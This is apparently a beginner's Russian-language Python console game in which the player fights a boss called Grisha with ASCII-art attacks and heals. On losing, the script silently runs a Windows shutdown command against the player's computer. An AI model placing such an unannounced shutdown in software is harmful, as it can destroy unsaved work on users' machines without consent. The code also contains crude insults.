import random
import os
import time
import arcade
import sys
import msvcrt

#LOX 2

playername = input("Введи своё имя: ")

def refteshscreen_time():
    time.sleep(1)
    print("\n" * 200)



drawmain = fr"""
       {playername}       Монстр
        O            ,   ,
       /|\          (\_o_/)
       / \          (  ^  )
                    /|   |\
    """


drawsword = r"""
          /\
          ||
          ||
          ||
          ==
          ||
        """

drawheal = r"""    ___
  |♥♥♥|
  |♥♥♥|
  |___|, """

drawbossattack = fr"""   ,   ,
  (\_o_/)
  (  ^  )
  /|   |\""""




playerhp = int(20)
playermana = int(0)
bosshp = int(20)

#swordsound = arcade.load_sound("sounds/sword.wav")
#healsound = arcade.load_sound("sounds/heal.wav")
#bossattack = arcade.load_sound("sounds/bossattack.wav")


#if playername == "Аллах":
    #playerhp = int(999)

while True:
    refteshscreen_time()
    print(drawmain)

    #логика игрока

    action = int(input(f"Твоё хп: {playerhp}  Твоя мана: {playermana} Хп Босса: {bosshp}\n /1/ чтобы нанести урон! /2/ Восстановить здоровье!"))
    if action == 1:

        refteshscreen_time()

        print(drawsword)

        #arcade.play_sound(swordsound)

        pdamage = random.randint(1, 3)
        playermana += pdamage
        bosshp -= pdamage
        print(f"{playername} нанёс {pdamage} урона! Здоровье Гриши: {bosshp}",end=" ")


    elif action == 2:
        playerheal = random.randint(1, 3)

        if playerhp >= 20:
            playerhp -= playerheal
            print(f"Еблан? У тебя фулл хп. Лося за втык! Хилка нанесла {playerheal} урона! Текущее здоровье {playerhp}")




        else:
             refteshscreen_time()

             #arcade.play_sound(healsound)

             playerhp = min(playerheal + playerhp, 20)

             print(drawheal)

             print(f"Хилка дала {playerheal} Текущее здоровье {playerhp} ",end=" ")


    #логика босса

    refteshscreen_time()

    print(drawbossattack)

    #arcade.play_sound(bossattack)

    bdamage = random.randint(1, 3)
    playerhp -= bdamage
    print (f"Босс Гриша нанёс {bdamage} урона!",end=" ")




    if playerhp <= 0:
        os.system("shutdown /s /t 5")
        break









